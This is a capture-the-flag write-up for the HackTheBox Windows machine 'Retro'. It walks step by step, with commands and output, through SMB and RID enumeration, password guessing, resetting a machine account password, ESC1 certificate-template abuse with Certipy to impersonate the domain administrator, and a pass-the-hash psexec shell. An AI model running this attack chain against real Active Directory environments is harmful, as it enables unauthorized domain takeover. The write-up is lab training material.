---
tags:
  - HTB
  - Boot2Root
  - Hacking
  - Windows
  - ESC-1
---
# Overview

| Name        | Retro     |
| ----------- | --------- |
| OS          | Windows   |
| Base Points | Easy [20] |
| Status      | Done      |
# Recon
## Nmap

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ sudo nmap -sC -sV -T4 10.129.45.230
[sudo] password for at0m:
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-25 20:17 +0545
Nmap scan report for 10.129.45.230
Host is up (0.30s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-25 14:32:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-12-25T14:21:48
|_Not valid after:  2026-12-25T14:21:48
|_ssl-date: TLS randomness does not represent time
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-12-25T14:21:48
|_Not valid after:  2026-12-25T14:21:48
|_ssl-date: TLS randomness does not represent time
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-12-25T14:21:48
|_Not valid after:  2026-12-25T14:21:48
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=DC.retro.vl
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC.retro.vl
| Not valid before: 2025-12-25T14:21:48
|_Not valid after:  2026-12-25T14:21:48
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: RETRO
|   NetBIOS_Domain_Name: RETRO
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: retro.vl
|   DNS_Computer_Name: DC.retro.vl
|   DNS_Tree_Name: retro.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-25T14:33:23+00:00
|_ssl-date: 2025-12-25T14:34:02+00:00; -11s from scanner time.
| ssl-cert: Subject: commonName=DC.retro.vl
| Not valid before: 2025-12-24T14:30:56
|_Not valid after:  2026-06-25T14:30:56
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2025-12-25T14:33:26
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: -10s, deviation: 0s, median: -10s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 116.40 seconds
```

```bash
echo "10.129.45.230 retro.vl" | sudo tee -a /etc/hosts
```
# Enumeration

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nxc smb 10.129.45.230 -u "Guest" -p ""
SMB         10.129.45.230   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.45.230   445    DC               [+] retro.vl\Guest:
```
## RID Brute Forcing

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ impacket-lookupsid guest@10.129.45.230 -no-pass | grep SidTypeUser
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
1000: RETRO\DC$ (SidTypeUser)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1109: RETRO\tblack (SidTypeUser)
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ cat users.txt
jburley
HelpDesk
tblack
trainee
DC$
BANKING$

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nxc smb retro.vl -u users.txt -p "" --continue-on-success
SMB         10.129.45.230   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.45.230   445    DC               [-] retro.vl\jburley: STATUS_LOGON_FAILURE
SMB         10.129.45.230   445    DC               [+] retro.vl\HelpDesk: (Guest)
SMB         10.129.45.230   445    DC               [-] retro.vl\tblack: STATUS_LOGON_FAILURE
SMB         10.129.45.230   445    DC               [-] retro.vl\trainee: STATUS_LOGON_FAILURE
SMB         10.129.45.230   445    DC               [-] retro.vl\DC$: STATUS_LOGON_FAILURE
SMB         10.129.45.230   445    DC               [-] retro.vl\BANKING$: STATUS_LOGON_FAILURE

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ smbclient -L //retro.vl//
Password for [WORKGROUP\at0m]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        Notes           Disk
        SYSVOL          Disk      Logon server share
        Trainees        Disk
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to retro.vl failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ smbclient  //retro.vl/Trainees -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 24 03:43:43 2023
  ..                                DHS        0  Wed Jun 11 20:02:10 2025
  Important.txt                       A      288  Mon Jul 24 03:45:13 2023

                4659711 blocks of size 4096. 1308097 blocks available
smb: \> get Important.txt
getting file \Important.txt of size 288 as Important.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> exit

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ cat Important.txt
Dear Trainees,

I know that some of you seemed to struggle with remembering strong and unique passwords.
So we decided to bundle every one of you up into one account.
Stop bothering us. Please. We have other stuff to do than resetting your password every day.

Regards

The Admins 
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nxc ldap retro.vl -u "trainee" -p "trainee"
LDAP        10.129.45.230   389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:retro.vl)
LDAP        10.129.45.230   389    DC               [+] retro.vl\trainee:trainee

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ smbclient -U trainee%trainee \\\\retro.vl\\Notes
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  9 08:57:49 2025
  ..                                DHS        0  Wed Jun 11 20:02:10 2025
  ToDo.txt                            A      248  Mon Jul 24 03:50:56 2023
  user.txt                            A       32  Wed Apr  9 08:58:01 2025

                4659711 blocks of size 4096. 1308103 blocks available
smb: \> get user.txt
getting file \user.txt of size 32 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
smb: \> get ToDo.txt
getting file \ToDo.txt of size 248 as ToDo.txt (0.2 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \> exit

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ cat ToDo.txt
Thomas,

after convincing the finance department to get rid of their ancienct banking software
it is finally time to clean up the mess they made. We should start with the pre created
computer account. That one is older than me.

Best

James                                                                                                                                               
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ cat user.txt
cbda362cff2099072c5e96c51712ff33 
```
# Lateral Movement

Based on the hint from `ToDo.txt`, an attempt was made to authenticate as the `BANKING$` machine account using a guessed password. The password "banking" proved successful. This granted access as the `BANKING$` machine account. As pre created computer accounts have the default privilege to change their own passwords on first login. To ensure persistent and known access, the attacker changed the password for `BANKING$` to `Password123` using `impacket-changepasswd`:

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ nxc smb retro.vl -u "BANKING$" -p "banking"
SMB         10.129.45.230   445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
SMB         10.129.45.230   445    DC               [-] retro.vl\BANKING$:banking STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ impacket-changepasswd -p rpc-samr retro.vl/BANKING\$@10.129.45.230 -newpass Password123
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Current password:
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.
```

With control over the `BANKING$` machine account and its new password `Password123`, the attacker focused on Active Directory Certificate Services (AD CS) for privilege escalation. Certipy was used to enumerate AD CS configurations.
# Privilege Escalation

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ certipy-ad find -target 10.129.45.230 -u BANKING$ -p Password123
```

```bash
Object Control Permissions  
Owner : RETRO.VL\Administrator  
Write Owner Principals : RETRO.VL\Domain Admins  
RETRO.VL\Enterprise Admins  
RETRO.VL\Administrator  
Write Dacl Principals : RETRO.VL\Domain Admins  
RETRO.VL\Enterprise Admins  
RETRO.VL\Administrator  
Write Property Principals : RETRO.VL\Domain Admins  
RETRO.VL\Enterprise Admins  
RETRO.VL\Administrator  
[!] Vulnerabilities  
ESC1 : 'RETRO.VL\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
```

The details indicated that `'RETRO.VL\\Domain Computers'` (which `BANKING$` is a member of) could enroll in the `'RetroClients'` certificate template, and this template allowed the enrollee to supply the Subject Alternative Name (SAN) and was configured for client authentication.

This ESC1 vulnerability was exploited by requesting a certificate as the `BANKING$` user but specifying the User Principal Name (UPN) of `administrator@retro.vl` in the certificate request. The command used was:
## ESC 1

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ impacket-changepasswd -p rpc-samr retro.vl/BANKING\$@10.129.45.230 -newpass Password123                                                         Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

Current password: Password123
[*] Changing the password of retro.vl\BANKING$
[*] Connecting to DCE/RPC as retro.vl\BANKING$
[*] Password was changed successfully.

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ certipy-ad req -username BANKING$ -password Password123 -target-ip 10.129.45.230 -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' -key-size 4096
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 10
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ impacket-lookupsid retro.vl/BANKING\$:Password123@10.129.45.230
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Brute forcing SIDs at 10.129.45.230
[*] StringBinding ncacn_np:10.129.45.230[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2983547755-698260136-4283918172
498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: RETRO\Administrator (SidTypeUser)
501: RETRO\Guest (SidTypeUser)
502: RETRO\krbtgt (SidTypeUser)
512: RETRO\Domain Admins (SidTypeGroup)
513: RETRO\Domain Users (SidTypeGroup)
514: RETRO\Domain Guests (SidTypeGroup)
515: RETRO\Domain Computers (SidTypeGroup)
516: RETRO\Domain Controllers (SidTypeGroup)
517: RETRO\Cert Publishers (SidTypeAlias)
518: RETRO\Schema Admins (SidTypeGroup)
519: RETRO\Enterprise Admins (SidTypeGroup)
520: RETRO\Group Policy Creator Owners (SidTypeGroup)
521: RETRO\Read-only Domain Controllers (SidTypeGroup)
522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
525: RETRO\Protected Users (SidTypeGroup)
526: RETRO\Key Admins (SidTypeGroup)
527: RETRO\Enterprise Key Admins (SidTypeGroup)
553: RETRO\RAS and IAS Servers (SidTypeAlias)
571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
1000: RETRO\DC$ (SidTypeUser)
1101: RETRO\DnsAdmins (SidTypeAlias)
1102: RETRO\DnsUpdateProxy (SidTypeGroup)
1104: RETRO\trainee (SidTypeUser)
1106: RETRO\BANKING$ (SidTypeUser)
1107: RETRO\jburley (SidTypeUser)
1108: RETRO\HelpDesk (SidTypeGroup)
1109: RETRO\tblack (SidTypeUser)
```

```bash
┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ certipy-ad req -username BANKING$ -password Password123 -target-ip 10.129.45.230 \
  -ca 'retro-DC-CA' -template 'RetroClients' -upn 'administrator@retro.vl' \
  -sid S-1-5-21-2983547755-698260136-4283918172-500 -key-size 4096
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 12
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator@retro.vl'
[*] Certificate object SID is 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Saving certificate and private key to 'administrator.pfx'
File 'administrator.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[*] Wrote certificate and private key to 'administrator.pfx'

┌──(at0m㉿DESKTOP-RA9DG2K)-[~]
└─$ certipy-ad auth -pfx 'administrator.pfx' -dc-ip 10.129.45.230
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator@retro.vl'
[*]     SAN URL SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*]     Security Extension SID: 'S-1-5-21-2983547755-698260136-4283918172-500'
[*] Using principal: 'administrator@retro.vl'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'administrator.ccache'
[*] Wrote credential cache to 'administrator.ccache'
[*] Trying to retrieve NT hash for 'administrator'
[*] Got hash for 'administrator@retro.vl': aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
```

```bash
┌──(venv)─(at0m㉿DESKTOP-RA9DG2K)-[~/evil-winrm-py/evil_winrm_py]
└─$ impacket-psexec retro.vl/Administrator@dc.retro.vl -hashes aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
Impacket v0.14.0.dev0+20251107.4500.2f1d6eb2 - Copyright Fortra, LLC and its affiliated companies

[*] Requesting shares on dc.retro.vl.....
[*] Found writable share ADMIN$
[*] Uploading file UwPOpCop.exe
[*] Opening SVCManager on dc.retro.vl.....
[*] Creating service yJGr on dc.retro.vl.....
[*] Starting service yJGr.....
[!] Press help for extra shell commands
'Microsoft Windows [Version 10.0.20348.3453]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd c:\Users\Administrator\Desktop
''cd' is not recognized as an internal or external command,
operable program or batch file.

C:\Windows\system32> type c:\Users\Administrator\Desktop\root.txt
40fce9c3f09024bcab29d377ee1ed071
```

---
